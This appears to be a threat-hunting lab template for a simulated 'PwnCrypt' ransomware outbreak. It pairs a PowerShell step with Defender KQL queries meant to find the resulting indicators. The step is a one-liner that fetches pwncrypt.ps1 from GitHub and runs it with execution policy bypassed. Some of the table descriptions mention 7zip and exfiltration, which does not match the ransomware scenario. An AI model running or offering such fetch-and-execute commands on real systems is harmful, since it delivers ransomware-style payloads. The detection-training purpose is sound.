# Threat Event (Zero Day Ransomware PwnCrypt Outbreak)
**Use of Powershell to run "Malicious" script**

## Steps the "Bad Actor" took Create Logs and IoCs:
1. Execute the following code in Powershell:
- `Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1' -OutFile 'C:\programdata\pwncrypt.ps1';cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\pwncrypt.ps1`

## What this script does:
-Intended for use in controlled environments only. This script performs two main actions:

    Downloads a PowerShell script:
    It uses Invoke-WebRequest to retrieve pwncrypt.ps1 from a GitHub URL and saves it to C:\programdata\pwncrypt.ps1.

    Executes the downloaded script:
    It then uses cmd to launch PowerShell with execution policy bypassed, running the downloaded pwncrypt.ps1 script.

- This allows the script to run without user confirmation or policy restrictions, simulating how a malicious payload might be delivered and executed during a cyberattack scenario. 
---

## Tables Used to Detect IoCs:
| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceProcessEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceinfo-table|
| **Purpose**| Used for detection of archival software execution. |

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceFileEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceinfo-table|
| **Purpose**| Used to detect the silent installation of 7zip as well as execution of exfiltratedata.ps1 powershell script.|

| **Parameter**       | **Description**                                                              |
|---------------------|------------------------------------------------------------------------------|
| **Name**| DeviceNetworkEvents|
| **Info**|https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table|
| **Purpose**| Used to determine if any data has been exfiltrated from the network.|

---

## Related Queries:
```kql
// Look for any kind of archive activity
let archive_applications = dynamic(["winrar.exe", "7z.exe", "winzip32.exe", "peazip.exe", "Bandizip.exe", "UniExtract.exe", "POWERARC.EXE", "IZArc.exe", "AshampooZIP.exe", "FreeArc.exe"]);
let VMName = "windows-target-1";
DeviceProcessEvents
| where FileName has_any(archive_applications)
| order by Timestamp desc


// Look for any file activity, based on the Timestamp from any discovered process activity
let specificTime = datetime(2024-10-15T19:00:48.5615171Z);
let VMName = "windows-target-1";
DeviceFileEvents
| where Timestamp between ((specificTime - 1m) .. (specificTime + 1m))
| where DeviceName == VMName
| order by Timestamp desc


// Look for any network activity, based on the Timestamp from the process or file activity
let VMName = "windows-target-1";
let specificTime = datetime(2024-10-15T19:00:48.5615171Z);
DeviceNetworkEvents
| where Timestamp between ((specificTime - 2m) .. (specificTime + 2m))
| where DeviceName == VMName
| order by Timestamp desc


```

---

## Created By:
- **Author Name**: Jordan West
- **Author Contact**: https://www.linkedin.com/in/jordan-west-it/
- **Date**: April 16, 2025

## Validated By:
- **Reviewer Name**: 
- **Reviewer Contact**: 
- **Validation Date**: 

---

## Additional Notes:
- **None**

---

## Revision History:
| **Version** | **Changes**                   | **Date**         | **Modified By**   |
|-------------|-------------------------------|------------------|-------------------|
| 1.0         | Initial Draft                 |`September 6, 2024`| `Josh Madakor` |
| 2.0         | Updated draft                 | `April 16, 2025`  | `Jordan West`   |


